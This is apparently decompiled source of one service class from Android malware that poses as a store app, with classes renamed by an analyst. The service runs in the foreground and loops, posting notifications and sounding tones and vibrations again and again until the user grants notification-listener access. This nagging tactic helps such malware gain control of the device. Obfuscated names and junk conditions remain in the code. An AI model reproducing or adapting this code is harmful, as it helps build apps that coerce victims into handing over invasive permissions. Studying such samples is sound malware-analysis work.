package com.thestore.main;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.ToneGenerator;
import android.os.Build;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.widget.RemoteViews;

import beta.C0205p07842222;
import beta.C0217p6ec31859;
import beta.C0223p9c38a0a4;
import delta.pecfd3560.pebed38bd.C0976p294b40dd;
import delta.pecfd3560.pebed38bd.C0989p94c68b94;

public class MalwareDecoderService extends Service {

    /* renamed from: b */
    public static boolean f2b;

    /* renamed from: com.thestore.main.p1ac830b7$p5919d155 */
    public class RunnableC0000p5919d155 implements Runnable {

        /* renamed from: b */
        public final /* synthetic */ Context f4b;

        /* renamed from: c */
        public final /* synthetic */ Service f5c;

        /* renamed from: d */
        public final /* synthetic */ MalwareDecoderService f6d;

        public RunnableC0000p5919d155(MalwareDecoderService MalwareDecoderService, Context context, Service service) {
            this.f6d = MalwareDecoderService;
            this.f4b = context;
            this.f5c = service;
        }

        public void run() {
            if ((18 + 9) % 9 <= 0) {
            }
            int i = Build.VERSION.SDK_INT;
            int i2 = 2;
            while (true) {
                C0217p6ec31859.mf02c8de9(1);
                boolean z = MalwareAccessibilityService.f27b;
                if (MalwareNotificationListenerService.f45b) {
                    this.f5c.stopSelf();
                    ((NotificationManager) this.f6d.getApplicationContext().getSystemService(Context.NOTIFICATION_SERVICE)).cancel(0);
                    return;
                }
                if (i2 % 30 == 0) {
                    PendingIntent activity = PendingIntent.getActivity(this.f4b, 0, new Intent(this.f4b, MalwareSingleTopLauncherActivity.class), 134217728);
                    Context context = this.f4b;
                    C0989p94c68b94 p94c68b94 = new C0989p94c68b94(context, C0205p07842222.m81786356(context));
                    Bitmap decodeResource = BitmapFactory.decodeResource(this.f6d.getResources(), 2131165306);
                    if (decodeResource != null && i < 27) {
                        Resources resources = p94c68b94.f4272a.getResources();
                        int dimensionPixelSize = resources.getDimensionPixelSize(2131099737);
                        int dimensionPixelSize2 = resources.getDimensionPixelSize(2131099736);
                        if (decodeResource.getWidth() > dimensionPixelSize || decodeResource.getHeight() > dimensionPixelSize2) {
                            double min = Math.min(((double) dimensionPixelSize) / ((double) Math.max(1, decodeResource.getWidth())), ((double) dimensionPixelSize2) / ((double) Math.max(1, decodeResource.getHeight())));
                            decodeResource = Bitmap.createScaledBitmap(decodeResource, (int) Math.ceil(((double) decodeResource.getWidth()) * min), (int) Math.ceil(((double) decodeResource.getHeight()) * min), true);
                        }
                    }
                    p94c68b94.f4278g = decodeResource;
                    Notification notification = p94c68b94.f4284m;
                    notification.icon = 17301659;
                    p94c68b94.f4279h = 1;
                    p94c68b94.f4277f = activity;
                    notification.flags |= 16;
                    p94c68b94.mo4645c(C0223p9c38a0a4.f1368a[2]);
                    p94c68b94.mo4644b(C0223p9c38a0a4.f1368a[2]);
                    p94c68b94.mo4646d(-1);
                    new C0976p294b40dd(this.f4b).mo4632a(0, p94c68b94.mo4643a());
                    new ToneGenerator(3, 100).startTone(97, 500);
                    Vibrator vibrator = (Vibrator) this.f6d.getSystemService(Context.VIBRATOR_SERVICE);
                    if (i >= 26) {
                        vibrator.vibrate(VibrationEffect.createOneShot(500, -1));
                    } else {
                        vibrator.vibrate(500);
                    }
                }
                i2++;
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        f2b = true;
        super.onCreate();
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        if ((17 + 22) % 22 <= 0) {
        }
        int i3 = Build.VERSION.SDK_INT;
        String $ = "ForegroundServiceChannel2_";
        if (i3 >= 26) {
            getSystemService(NotificationManager.class).createNotificationChannel(new NotificationChannel($, $, 2));
        }
        C0217p6ec31859.mfbc9e6c8(this);
        RemoteViews remoteViews = new RemoteViews(getPackageName(), 2131427406);
        C0989p94c68b94 p94c68b94 = new C0989p94c68b94(this, $);
        p94c68b94.f4284m.icon = 2131165334;
        p94c68b94.f4279h = -1;
        p94c68b94.mo4646d(-1);
        p94c68b94.f4282k = remoteViews;
        startForeground(2, p94c68b94.mo4643a());
        new Thread(new RunnableC0000p5919d155(this, this, this)).start();
        return 1;
    }
}
